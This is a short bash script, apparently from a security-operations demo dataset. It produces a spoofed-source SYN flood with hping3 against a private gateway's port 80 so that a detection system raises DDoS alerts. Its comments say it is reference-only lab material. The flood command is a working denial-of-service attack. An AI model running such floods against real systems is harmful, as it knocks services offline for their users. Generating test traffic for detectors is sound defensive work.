#!/bin/bash
# =====================================================================
# AI-SOC DEMO — DAY 4 (2026-04-23)
# Phase   : External DDoS burst (NOT from .23 — unrelated incident)
# Source  : ~80 spoofed external IPs
# Target  : 192.168.168.254 (gateway, port 80)
#
# WARNING — DEMO REFERENCE ONLY (not executed live).
# This is the ONLY DDoS sample in the dataset, included to give the
# "Attack Types" panel coverage for the DDoS ML class. The live demo
# on 25/04 does NOT perform DDoS (single-IP scenario).
# =====================================================================
set -e
GATEWAY="192.168.168.254"
echo "[Day-4 19:42] hping3 spoofed-source SYN burst (3 minutes)"

# Real reconstruction (audit-only). Requires root.
timeout 180 hping3 -c 220 -d 64 -S -w 64 -p 80 \
  --flood --rand-source "$GATEWAY" >/dev/null 2>&1 || true

echo "[Day-4] complete — expected: DDoS ALERT cluster (~60 unique src_ip)"
